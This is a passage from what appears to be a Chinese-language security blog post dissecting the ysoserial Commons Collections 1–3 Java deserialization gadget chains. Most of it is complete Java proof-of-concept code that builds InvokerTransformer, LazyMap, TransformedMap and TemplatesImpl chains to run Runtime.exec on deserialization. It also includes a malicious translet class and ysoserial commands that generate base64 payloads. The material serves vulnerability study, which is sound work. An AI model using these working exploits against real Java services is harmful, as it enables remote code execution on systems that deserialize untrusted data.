class_">ByteArrayInputStream</span>(base64decodeBytes);<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(data);<br>        Object obj= ois.readObject();<br>        System.out.println(obj);<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="lazymap链"><a class="markdownIt-Anchor" href="#lazymap链"></a> LazyMap链</h4><p>ysoserial中的CC1</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">A<span class="hljs-function"><span class="hljs-title">nnotationInvocationHandler</span>.readObject-&gt;</span>H<span class="hljs-function"><span class="hljs-title">ashMap</span>(Proxy).entrySet-&gt;</span>A<span class="hljs-function"><span class="hljs-title">nnotationInvocationHandler</span>.invoke-&gt;</span>L<span class="hljs-function"><span class="hljs-title">azyMap</span>.get-&gt;</span>ChainedTransformer.transform<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1_</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] Transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(Transformers);<br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; Lazymap = LazyMap.decorate(map,chainedTransformer);<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationhdlConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>        annotationInvocationhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Target.class,Lazymap);<br><span class="hljs-comment">//动态代理</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,h);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationhdlConstructor.newInstance(Override.class,mapProxy);<br>        String s= serialize(o);<br>        deserialize(s);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="调试"><a class="markdownIt-Anchor" href="#调试"></a> 调试</h5><p>需要自己重写LazyMap.java不然调试都进不去然后就命令执行完了根本调不懂</p><img src="/2024/09/07/ysoserial/1.jpg" class=""><h3 id="commons-collection-2"><a class="markdownIt-Anchor" href="#commons-collection-2"></a> Commons Collection 2</h3><p>影响版本：jdk无限制，CommonsCollections 4.0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections2 <span class="hljs-string">&quot;whoami&quot;</span> |<span class="hljs-built_in">base64</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">P<span class="hljs-function"><span class="hljs-title">riorityQueue</span>.readObject-&gt;</span>P<span class="hljs-function"><span class="hljs-title">riorityQueue</span>.heapify-&gt;</span>P<span class="hljs-function"><span class="hljs-title">riorityQueue</span>.siftDown-&gt;</span>P<span class="hljs-function"><span class="hljs-title">riorityQueue</span>.siftDownUsingComparator-&gt;</span>T<span class="hljs-function"><span class="hljs-title">ransformingComparator</span>.compare-&gt;</span>I<span class="hljs-function"><span class="hljs-title">nvokerTransformer</span>.transform-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.newTransformer-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.getTransletInstance-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.defineTransletClasses-&gt;</span>TemplatesImpl.defineClass<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;;<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_transletIndex&quot;</span>,<span class="hljs-number">1</span>);<br><br>        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        priorityQueue.add(templatesimpl);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        SetFieldValue(transformingComparator,<span class="hljs-string">&quot;transformer&quot;</span>,invokerTransformer);<br>        String s= serialize(priorityQueue);<br>        deserialize(s);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="commons-collection-3"><a class="markdownIt-Anchor" href="#commons-collection-3"></a> Commons Collection 3</h3><p>影响版本：jdk&lt;8u71 ，CommonsCollections 3.1 - 3.2.1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections3 <span class="hljs-string">&quot;whoami&quot;</span> |<span class="hljs-built_in">base64</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">前半条链是CC1-&gt;T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.newTransformer-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.getTransletInstance-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.defineTransletClasses-&gt;</span>TemplatesImpl.defineClass<br></code></pre></td></tr></table></figure><h4 id="invoketransformertransform"><a class="markdownIt-Anchor" href="#invoketransformertransform"></a> InvokeTransformer.transform</h4><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">前半条链是CC1-&gt;I<span class="hljs-function"><span class="hljs-title">nvokeTransformer</span>.transform-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.newTransformer-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.getTransletInstance-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.defineTransletClasses-&gt;</span>TemplatesImpl.defineClass<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;;<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_transletIndex&quot;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-comment">//        templatesimpl.newTransformer();</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templatesimpl),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt; ();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;fru1ts&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap= TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class c= Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor constructor= c.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        Object object= constructor.newInstance(Retention.class,transformedMap);<br><span class="hljs-comment">//        serializeBase(object);</span><br>        deserialize(serializeBase(object));<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serializeBase</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        ByteArrayOutputStream baos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String ser)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] base64decodeBytes= Base64.getDecoder().decode(ser);<br>        ByteArrayInputStream data=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodeBytes);<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(data);<br>        Object obj= ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>&#123;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="instantiatetransformertransform"><a class="markdownIt-Anchor" href="#instantiatetransformertransform"></a> InstantiateTransformer.transform</h4><p>ysoserial用的就是这个</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">前半条链是CC1-&gt;I<span class="hljs-function"><span class="hljs-title">nstantiateTransformer</span>.transform-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.newTransformer-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.getTransletInstance-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.defineTransletClasses-&gt;</span>TemplatesImpl.defineClass<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 